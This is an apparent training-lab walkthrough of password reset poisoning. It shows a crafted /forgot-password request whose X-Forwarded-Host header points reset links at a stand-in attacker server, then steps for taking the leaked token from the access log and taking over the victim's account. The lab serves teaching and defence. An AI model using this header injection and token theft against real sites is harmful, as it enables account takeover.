======================================================================
              LAB: Password Reset Poisoning via Middleware
======================================================================

GOAL:
------
✔ Reset Carlos's password by abusing the password reset link generation.

======================================================================
                         HOW THE VULNERABILITY WORKS
======================================================================

                      Normal Password Reset Flow

+--------+         Forgot Password          +-------------+
| User   | -------------------------------> | Web Server  |
+--------+                                  +-------------+
                                                  |
                                                  | Generates Reset Link
                                                  v
                                     https://website.com/reset?token=ABC123
                                                  |
                                                  v
                                            Sends Email
                                                  |
                                                  v
                                             +-----------+
                                             |   Carlos  |
                                             +-----------+
                                                  |
                                                  v
                                         Clicks Legitimate Link


======================================================================

                   Vulnerable Password Reset Flow

Attacker controls:

              X-Forwarded-Host: attacker.exploit-server.net

                           |
                           |
                           v

+----------+        Forgot Password       +-------------+
| Attacker | ---------------------------> | Web Server  |
+----------+                              +-------------+
                                                |
                                                | Uses X-Forwarded-Host
                                                | while generating URL
                                                v

      https://attacker.exploit-server.net/reset?token=VICTIM_TOKEN

                                                |
                                                v
                                         Sends Email to Carlos
                                                |
                                                v
                                         Carlos clicks link
                                                |
                                                v
                                   Browser requests attacker's server
                                                |
                                                v
                                  Token appears in attacker's logs

======================================================================
                           ATTACK FLOW
======================================================================

            Step 1
            ======

+--------------------------+
| Login as:                |
| username = wiener        |
| password = peter         |
+--------------------------+

        |
        v

Open "Forgot Password"

        |
        v

Request reset for your own account

        |
        v

Observe email contains:

https://lab/reset?token=XXXX


Purpose:
--------
Understand how password reset works.


======================================================================
            Step 2
======================================================================

Intercept request:

POST /forgot-password

Example:

POST /forgot-password
Host: lab.net

username=wiener

        |
        v

Send to Burp Repeater.


======================================================================
            Step 3
======================================================================

Notice application trusts:

X-Forwarded-Host

Original:

POST /forgot-password

Host: lab.net

username=wiener


Modify to:

POST /forgot-password

Host: lab.net

X-Forwarded-Host: YOUR-ID.exploit-server.net

username=carlos


Meaning:

Instead of generating

https://lab.net/reset?token=...

Server now generates

https://YOUR-ID.exploit-server.net/reset?token=...

This is the vulnerability.


======================================================================
            Step 4
======================================================================

Victim (Carlos) receives:

+-----------------------------------------------------------+
| https://YOUR-ID.exploit-server.net/reset?token=XYZ123     |
+-----------------------------------------------------------+

Carlos clicks it.


Browser sends request to:

YOUR exploit server


======================================================================
            Step 5
======================================================================

Open Exploit Server

        |

Access Log

        |

You will see:

GET /forgot-password?temp-forgot-password-token=XYZ123


Copy:

XYZ123

This is Carlos's reset token.


======================================================================
            Step 6
======================================================================

Generate a normal password reset link
for YOUR OWN account.

Example:

https://lab.net/forgot-password?temp-forgot-password-token=AAAA


Replace:

AAAA

with

XYZ123


Result:

https://lab.net/forgot-password?temp-forgot-password-token=XYZ123


Now open it.


======================================================================
            Step 7
======================================================================

Reset Carlos's password.

Example:

New Password:

Password123!


Submit.


======================================================================
            Step 8
======================================================================

Login as:

Username:
carlos

Password:
Password123!


Lab Solved ✔


======================================================================
                    VISUAL SUMMARY
======================================================================


             +--------------------+
             | Attacker           |
             +--------------------+
                      |
                      |
                      | POST /forgot-password
                      | username=carlos
                      | X-Forwarded-Host=attacker
                      |
                      v
             +--------------------+
             | Vulnerable Server  |
             +--------------------+
                      |
                      | Creates malicious reset URL
                      |
                      v
      https://attacker.exploit-server.net/reset?token=ABC

                      |
                      |
                 Email to Carlos
                      |
                      v
             +--------------------+
             | Carlos             |
             +--------------------+
                      |
                Clicks Link
                      |
                      v
             +--------------------+
             | Exploit Server     |
             +--------------------+
                      |
                Access Log
                      |
               token = ABC
                      |
                      v
             Attacker steals token
                      |
                      |
                      v
     Uses token on legitimate reset endpoint
                      |
                      v
            Resets Carlos's password
                      |
                      v
             Logs into Carlos account


======================================================================
                     WHY THIS VULNERABILITY EXISTS
======================================================================

❌ Server trusts the X-Forwarded-Host header supplied by the client.

Instead of using:

https://lab.net/

it uses:

https://attacker.exploit-server.net/

to build password reset URLs.

As a result:

Attacker
      ↓
Changes Host Header
      ↓
Victim receives attacker-controlled reset URL
      ↓
Victim clicks link
      ↓
Reset token leaks to attacker
      ↓
Attacker resets victim's password


======================================================================
                 KEY TAKEAWAY (1-Line Memory Trick)
======================================================================

"Never trust client-controlled headers (like X-Forwarded-Host) when
generating password reset links, because they can redirect sensitive
reset tokens to an attacker-controlled server."
======================================================================